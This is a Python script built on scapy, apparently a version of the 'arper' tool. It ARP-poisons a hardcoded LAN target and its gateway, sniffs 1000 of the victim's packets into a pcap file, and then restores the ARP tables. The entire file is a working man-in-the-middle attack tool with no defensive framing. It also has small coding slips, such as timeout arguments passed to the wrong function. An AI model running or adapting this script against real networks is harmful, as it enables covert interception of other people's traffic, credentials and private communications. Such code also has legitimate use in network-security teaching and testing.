from scapy.all import *
import os
import sys
import threading
import signal


interface = 'wlp2s0'
target_ip = '192.168.1.114'
gateway_ip = '192.168.1.1'
packet_count = 1000


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    print('[*] Restoring previous network state.')

    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)

    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):

    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address, timeout=2, retry=10))

    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

    poison_target = ARP()
    
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print('[*] Commencing ARP infection. [CTRL+C to stop]')

    while True:
        
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        
    print('[*] Attack finished.')
    
    return


conf.iface = interface
conf.verb = 0

print('[*] Configuration of interface: %s' % interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print('[!] Could not determine gateway MAC address. Exiting...')
    sys.exit(0)
else:
    print('[*] Gate %s has address %s' % (gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print('[!] Could not determine target MAC address. Exiting...')
    sys.exit(0)
else:
    print('[*] Trarget %s has address %s' % (target_ip, target_mac))

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print('[*] Launching sniffer for %d packages' %packet_count)

    bpf_filter = 'ip host %s' % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # printing results to PCAP file
    wrpcap('arper.pcap', packets)

    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)